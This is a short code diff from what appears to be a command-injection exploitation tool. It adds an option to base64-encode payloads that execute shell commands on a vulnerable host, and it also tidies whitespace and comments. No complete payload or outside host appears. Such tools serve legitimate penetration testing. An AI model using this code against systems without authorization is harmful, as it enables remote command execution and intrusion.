@@ -279,7 +279,7 @@ def referer_injection_test(url, vuln_parameter, payload):
 # The main command injection exploitation.
 # -------------------------------------------
 def injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
-  
+
   # Execute shell commands on vulnerable host.
   if alter_shell :
     payload = fb_payloads.cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE) 
@@ -289,7 +289,10 @@ def injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method,
   # Fix prefixes / suffixes
   payload = parameters.prefixes(payload, prefix)
   payload = parameters.suffixes(payload, suffix)
-      
+
+  if menu.options.base64:
+    payload = base64.b64encode(payload)   
+
   # Check if defined "--verbose" option.
   if menu.options.verbose:
     sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)
@@ -309,10 +312,10 @@ def injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method,
   else:
     # Check if defined method is GET (Default).
     if http_request_method == "GET":
+
       # Check if its not specified the 'INJECT_HERE' tag
       url = parameters.do_GET_check(url)
-      
-      # Encoding spaces.
+
       payload = payload.replace(" ","%20")
 
       target = re.sub(settings.INJECT_TAG, payload, url)
